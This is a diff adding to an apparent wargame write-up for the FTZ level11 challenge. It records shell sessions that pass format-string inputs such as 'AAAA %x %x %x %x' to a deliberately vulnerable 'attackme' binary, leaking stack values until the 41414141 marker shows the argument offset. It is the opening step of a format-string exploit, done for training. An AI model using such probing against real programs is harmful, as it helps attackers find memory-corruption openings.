@@ -38,3 +38,19 @@ Segmentation fault
 ```
 
 This seems that Segmentation falut will be printed if there is no argument and then the argv[1] is the value of garbage.
+
+```
+[level11@ftz level11]$ ./attackme "AAAA"
+AAAA
+[level11@ftz level11]$ ./attackme "AAAA %x"
+AAAA bffffc40
+[level11@ftz level11]$ ./attackme "AAAA %x %x"
+AAAA bffffc3d bffff300
+[level11@ftz level11]$ ./attackme "AAAA %x %x %x"
+AAAA bffffc3a bfffdb80 1
+[level11@ftz level11]$ ./attackme "AAAA %x %x %x %x"
+AAAA bffffc37 bfffde00 1 41414141
+```
+
+AAAA means 41414141
+
